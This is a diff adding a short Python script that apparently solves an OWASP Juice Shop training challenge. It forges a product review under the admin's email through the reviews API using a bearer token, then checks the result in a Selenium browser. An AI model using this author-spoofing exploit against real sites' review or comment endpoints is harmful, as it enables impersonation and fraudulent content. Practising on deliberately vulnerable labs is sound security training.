@@ -1,0 +1,37 @@
+import requests
+import os
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
+try:
+	headers = {
+		'Content-Type': 'application/json',
+		'Authorization': os.environ['OWASP_JUICE_SHOP_BEARER_TOKEN']
+	}
+	
+	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
+	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
+	# Define the API endpoint URL
+	url = f"http://{IP_ADDRESS}:{PORT}/rest/products/6/reviews"
+
+	# Prepare the JSON payload for the request body
+	#payload = {"message":"sdfh","author":"test@test.com"}
+	payload = {"message":"Bad review", "author":"admin@juice-sh.op"}
+
+	# Send the POST request with the JSON payload
+	response = requests.put(url, json=payload, headers=headers)
+
+	# Print the response status code and JSON content
+	print(f"Status Code: {response.status_code}")
+
+	driver = webdriver.Chrome()
+	driver.get(f"http://{IP_ADDRESS}:{PORT}")
+
+	# Open the web page to check if challenge solved
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
+	input("Press Enter...")
+
+finally:
+  driver.quit()
